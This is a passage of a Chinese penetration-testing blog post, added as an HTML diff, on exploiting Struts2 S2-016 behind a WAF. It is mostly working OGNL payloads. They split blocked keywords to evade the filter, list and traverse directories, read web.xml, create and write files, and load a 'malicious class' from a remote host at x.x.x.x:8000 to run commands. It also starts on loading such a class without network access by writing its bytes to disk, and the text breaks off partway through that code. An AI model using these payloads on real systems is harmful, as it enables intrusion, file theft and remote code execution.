@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>struts2绕过waf读写文件及另类方式执行命令 | f0ng</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="f0ng">
+    <meta name="author" content="f0ng">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="f0ng" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link">AAA</a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link">BBB</a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">f0ng</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/f0ng" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/ff0ng" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2022-04-14T02:40:57.000Z" itemprop="datePublished">
+          2022-04-14
+      </time>
+    
+</span>
+                <h1>struts2绕过waf读写文件及另类方式执行命令</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<p>之前碰到过好几次Struts2，还都是016，项目、众测都遇到过，每次都只是证明了一下存在，由于waf的存在，没有深入去利用，这里简单的记录下。</p>
+<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>xray或者Struts2漏扫可以扫到网站存在Struts2漏洞<br><img src="https://files.mdnice.com/user/23628/a4bfd434-a3ab-42da-9a5b-6d4ba5ee27b2.png"></p>
+<p>但是执行命令会发现直接<code>Connection Reset</code>，很明显是被waf拦截了</p>
+<h2 id="0x02-探究waf规则"><a href="#0x02-探究waf规则" class="headerlink" title="0x02 探究waf规则"></a>0x02 探究waf规则</h2><p>一个一个删除关键字，发现拦截的关键字有三个：<br><code>Runtime</code>、<code>dispatcher</code></p>
+<ul>
+<li><code>Runtime</code>很熟悉，执行命令一般都用这个，拦截了这个关键字，执行命令还是比较困难的</li>
+<li><code>dispatcher</code>比较陌生，查了资料以后发现是读取Struts2的请求对象中的关键字</li>
+<li><code>getRealPath</code>字面意思，获取真实路径</li>
+</ul>
+<h2 id="0x03-尝试突破"><a href="#0x03-尝试突破" class="headerlink" title="0x03 尝试突破"></a>0x03 尝试突破</h2><p>简单说一下思路，在绕过waf关键字的前提下进行读、写文件，如webshell落地；或者直接执行命令，如CS上线等。</p>
+<ul>
+<li><p><code>dispatcher</code>绕过<br>可以通过拼接进行绕过，部分代码如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;)</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><h2 id="读、写文件绕过"><a href="#读、写文件绕过" class="headerlink" title="读、写文件绕过"></a>读、写文件绕过</h2><h5 id="0x001-获取web目录"><a href="#0x001-获取web目录" class="headerlink" title="0x001 获取web目录"></a>0x001 获取web目录</h5><p>首先要绕过<code>getRealPath</code>关键字,可以使用<code>req.getClass().getResource(&quot;/&quot;).getPath()</code>进行绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(#req.getClass().getResource(&quot;/&quot;).getPath()),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://files.mdnice.com/user/23628/41691262-36c4-43ef-99c3-6409c41dca84.png"></p>
+</li>
+</ul>
+<h5 id="0x002-查看目录的文件并列举出来"><a href="#0x002-查看目录的文件并列举出来" class="headerlink" title="0x002 查看目录的文件并列举出来"></a>0x002 查看目录的文件并列举出来</h5><p>读取当前目录的第一个文件名，payload如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[1]),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/9cfba1d0-3b6d-490c-8ceb-f28057a9d045.png"></p>
+<p>这里由于也没有进行深入研究ognl的迭代，所以直接在<code>index</code>累加了数字，如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[1]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[2]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[3]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[4]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[5]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[6]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/&quot;).getPath()).list()[7]),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/d2f5b346-180a-41fb-b2c3-69401afebeb8.png"></p>
+<p>穿越目录列举文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[1]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[2]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[3]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[4]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[5]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[6]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[7]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[6]),#ot.print(&#x27;\n&#x27;),#ot.print(new java.io.File(#req.getClass().getResource(&quot;/../&quot;).getPath()).list()[8]),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/95b806af-efcc-4e4c-8af2-25e28feab360.png"></p>
+<h5 id="0x003-读取指定文件，危害升级——任意文件读取"><a href="#0x003-读取指定文件，危害升级——任意文件读取" class="headerlink" title="0x003 读取指定文件，危害升级——任意文件读取"></a>0x003 读取指定文件，危害升级——<code>任意文件读取</code></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.io.BufferedReader(new java.io.FileReader(&quot;/usr/local/apache-tomcat-7.0.57/webapps/ROOT/WEB-INF/web.xml&quot;)),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.print(#bb0.readLine()),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/dc4669df-caf0-4320-86c8-043514e3967c.png"><br>由于是按行读取文件，所以也是比较机械的使用了<code>readLine</code>函数</p>
+<h5 id="0x004-写入指定文件，危害升级——任意文件写入"><a href="#0x004-写入指定文件，危害升级——任意文件写入" class="headerlink" title="0x004 写入指定文件，危害升级——任意文件写入"></a>0x004 写入指定文件，危害升级——<code>任意文件写入</code></h5><p>创建文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.io.FileWriter(&quot;/usr/local/apache-tomcat-7.0.57/webapps/ROOT/WEB-INF/classes/message_ae.properties&quot;),#ot.print(#bb0.getClass()),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/b5a11881-b3ac-4bf6-bc32-3ef9d948d147.png"><br>创建文件成功</p>
+<p>后续又创建了一个<code>message_aaa.properties</code>文件,查看文件大小</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.io.File(&quot;/usr/local/apache-tomcat-7.0.57/webapps/ROOT/WEB-INF/classes/messages_aaa.properties&quot;),#ot.print(#bb0.length()),#ot.flush(),#ot.close()&#125;</span>  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/1912187f-1613-4aeb-94ef-bf4c8ce30034.png"></p>
+<p>发现只是创建了文件，但是没有写入内容，所以文件大小为0，对文件内容的写入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.io.BufferedWriter(new java.io.FileWriter(&quot;/usr/local/apache-tomcat-7.0.57/webapps/ROOT/WEB-INF/classes/messages_aaa.properties&quot;,true)),#bb0.append(&quot;aaaa&quot;),#bb0.flush(),#bb0.close(),#ot.print(#bb0),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/6dd656d4-9902-4f2e-8efd-d3235a1b9f95.png"><br>写入了四个字节的内容<code>aaaa</code></p>
+<p>再次查看文件大小</p>
+<p><img src="https://files.mdnice.com/user/23628/c09c28c2-5160-4be3-8732-08f0b42268c4.png"><br>大小更改，文件写入成功</p>
+<ul>
+<li><h2 id="执行命令绕过"><a href="#执行命令绕过" class="headerlink" title="执行命令绕过"></a>执行命令绕过</h2><h5 id="0x001-思路打开"><a href="#0x001-思路打开" class="headerlink" title="0x001 思路打开"></a>0x001 思路打开</h5>这里也是尝试了很久去绕过执行命令的关键字，发现都失败了，waf拦截的很死，而且也不能像<code>dispatcher</code>绕过一样拼接，几乎快放弃的时候，想到了加载恶意类去执行命令的这个方法<br>恶意类代码如下：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Filename: hello.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] commands = &#123; <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;test.xxx.dns.1433.eu.org&quot;</span> &#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        hello aa = <span class="keyword">new</span> hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+使用命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ javac hello.java</span><br></pre></td></tr></table></figure>
+编译成<code>class</code></li>
+</ul>
+<h5 id="0x002-初次尝试加载恶意类"><a href="#0x002-初次尝试加载恶意类" class="headerlink" title="0x002 初次尝试加载恶意类"></a>0x002 初次尝试加载恶意类</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.net.URL[]&#123;new java.net.URL(&quot;http://x.x.x.x:8000/&quot;)&#125;</span>,<span class="comment">#cc0=new java.net.URLClassLoader(#bb0),#cc0.loadClass(&quot;hello&quot;),#cc0.newInstance(),#ot.print(#cc0.getClass()),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+<p>转换成java代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL[] a = <span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://x.x.x.x:8000/&quot;</span>)&#125;;</span><br><span class="line">URLClassLoader b = <span class="keyword">new</span> java.net.URLClassLoader(a);</span><br><span class="line">b.loadClass(<span class="string">&quot;hello&quot;</span>).newInstance();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://files.mdnice.com/user/23628/2c6eb8d3-583c-45e4-b625-c5527c299f99.png"></p>
+<p>这里不知道为什么失败了，后面一步步调试，发现<code>loadClass</code>可以发起请求</p>
+<p><img src="https://files.mdnice.com/user/23628/c9852f6a-c6d6-46d8-9022-ec56643a0fff.png"></p>
+<p>但是实例化的时候出错了，后面也找不到什么解决方法，停滞了相当长的一段时间</p>
+<h5 id="0x003-成功加载恶意类"><a href="#0x003-成功加载恶意类" class="headerlink" title="0x003 成功加载恶意类"></a>0x003 成功加载恶意类</h5><p>后续又遇到了一个Struts2 016，然后循着之前所思考的继续往下，更改了实例化的方法，最终成功了，具体成功payload如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:http://www.baidu.com<span class="variable">$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#bb0=new java.net.URL[]&#123;new java.net.URL(&quot;http://x.x.x.x:8000/&quot;)&#125;</span>,<span class="comment">#cc0=new java.net.URLClassLoader(#bb0),#cc1=#cc0.loadClass(&quot;hello&quot;),#cc1.getDeclaredMethods()[0].invoke(#cc1.newInstance()),#ot.print(),#ot.flush(),#ot.close()&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL[] a = <span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://x.x.x.x:8000/&quot;</span>)&#125;;</span><br><span class="line">URLClassLoader b = <span class="keyword">new</span> java.net.URLClassLoader(a);</span><br><span class="line">b.loadClass(<span class="string">&quot;hello3&quot;</span>).getDeclaredMethods()[<span class="number">0</span>].invoke(b.loadClass(<span class="string">&quot;hello3&quot;</span>).newInstance());</span><br></pre></td></tr></table></figure>
+<p>使用<code>getDeclaredMethods</code>与<code>invoke</code>是可以成功加载恶意类执行命令的</p>
+<p><img src="https://files.mdnice.com/user/23628/19086a16-ad51-4af0-a959-31d8db280594.png"></p>
+<p><img src="https://files.mdnice.com/user/23628/a935acd3-1cda-429c-81ea-efbf6072b6bc.png"></p>
+<h5 id="0x004-不出网加载恶意类"><a href="#0x004-不出网加载恶意类" class="headerlink" title="0x004 不出网加载恶意类"></a>0x004 不出网加载恶意类</h5><p>后面又想了一会，如果在一个不出网的环境下，那怎么可以加载恶意类去执行命令呢，想到了之前的写入文件，先写入恶意类到本地，然后通过<code>file</code>协议去加载本地的恶意类，进而达到执行命令的目的</p>
+<p>一开始想用base64编码class文件进行写入，但是这里不知道为什么Base64的类引入不了，<code>java.util.Base64</code>和<code>sun.misc.BASE64Decoder</code>都不行</p>
+<p><img src="https://files.mdnice.com/user/23628/4df5b4e9-fdea-4a51-b673-2e2ec3d84fa2.png"></p>
+<p><img src="https://files.mdnice.com/user/23628/232de714-9df2-4099-9b34-e21452de66fe.png"></p>
+<p>这里打印了类名，但是无回显，说明payload内部环节有误</p>
+<p>后面转变了一下思路，base64如果不行，那我如果用<code>byte[]</code>去写入文件，是不是也可以做到无损？<br>这里沿用之前写webshell的类，即<code>new java.io.BufferedWriter(new java.io.FileWriter())</code></p>
+<p>还是之前的<code>hello.java</code>文件(其实这里如果实际当中利用，推荐写入还是为<code>hello.class</code>，因为需要加载恶意类，需要同一名称，下文为了区分开，我取了其他名称)</p>
+<p>读取hello.class的文件为<code>byte[]</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] data = getBytesByFile(<span class="string">&quot;hello.class&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    String total = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">byte</span> d:data) &#123;</span><br><span class="line">        total = total +  d + <span class="string">&quot;，&quot;</span>;</span><br><span class="line">   